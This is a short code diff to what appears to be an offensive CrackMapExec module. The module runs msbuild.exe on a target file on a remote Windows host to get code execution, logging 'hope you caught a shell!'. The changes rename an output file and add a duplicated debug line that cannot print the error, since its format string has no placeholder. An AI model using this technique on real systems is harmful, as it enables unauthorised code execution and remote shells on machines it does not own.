@@ -39,7 +39,7 @@ class CMEModule:
                 pass
         if self.arch == 'x64':
             winders = "%WINDIR%\\Microsoft.NET\\Framework64\\"+ self.ver+ "\\msbuild.exe"
-            command = '{} {} > file2.txt'.format(winders, self.targetFile)
+            command = '{} {} > file1.txt'.format(winders, self.targetFile)
         elif self.arch == 'x86':
             winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
             command = '{} {} > file1.txt'.format(winders, self.targetFile)
@@ -50,4 +50,5 @@ class CMEModule:
             context.log.success("Executed msbuild, hope you caught a shell!")
         except Exception as e:
             context.log.error("Msbuild failed")
+            context.log.debug("Error : ".format(str(e)))
             context.log.debug("Error : ".format(str(e)))
